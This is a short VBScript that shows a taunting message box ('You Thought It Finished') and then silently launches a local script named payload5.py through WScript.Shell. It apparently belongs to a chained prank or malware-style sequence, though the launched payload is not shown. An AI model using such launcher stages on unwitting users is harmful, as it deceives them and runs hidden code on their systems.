x=msgbox("You Thought It Finished" ,0, "?")
Dim shell
Set shell = WScript.CreateObject( "WScript.Shell" )
shell.Run("payload5.py")
Set shell = Nothing